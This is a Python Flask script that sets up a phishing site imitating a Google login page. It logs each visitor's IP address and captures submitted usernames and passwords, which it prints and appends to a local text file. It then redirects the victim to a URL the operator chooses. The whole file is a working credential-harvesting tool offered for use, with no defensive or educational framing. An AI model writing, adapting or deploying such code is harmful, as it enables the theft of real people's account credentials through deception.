from flask import Flask, render_template, request, redirect, url_for
from threading import Thread
import os
import time

app = Flask(__name__, template_folder='Phishing/templates/Google')

print("Let's set up your phishing site")
action_url = input('Paste the link here that will redirect the user after phishing (leave blank if you do not need a redirect): ')
port = input("Enter the port of your site (Default: 8080): ")

# Set default port if not provided
if not port:
    port = 8080
else:
    try:
        port = int(port)
    except ValueError:
        print("Invalid port number. Using default port 8080.")
        port = 8080

username = None

@app.route("/")
def home():
    user_ip = request.remote_addr
    print(f"User IP address: {user_ip}")
    return render_template('index.html')

@app.route("/login", methods=["POST"])
def login():
    global username
    username = request.form['username']
    password = request.form['password']
    user_ip = request.remote_addr
    
    print('User: ', username)
    print('Password: ', password)
    print(f"User IP address: {user_ip}")

    current_path = os.path.abspath(os.path.dirname(__file__))
    file_path = os.path.join(current_path, 'google_user_data.txt')

    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write(f"User: {username}, Password: {password}, IP: {user_ip}\n")
        print("Data written to file successfully.")
    except Exception as e:
        print(f"Error writing to file: {e}")
    
    # Redirect conditionally based on action_url
    if action_url:
        return redirect(action_url)
    else:
        return redirect(url_for('infa'))

@app.route("/info")
def infa():
    return render_template('Blok.html')

def run_flask():
    app.run(host='0.0.0.0', port=port, debug=True, use_reloader=False)

if __name__ == '__main__':
    print("Starting the server...")
    server_thread = Thread(target=run_flask)
    server_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping server...")
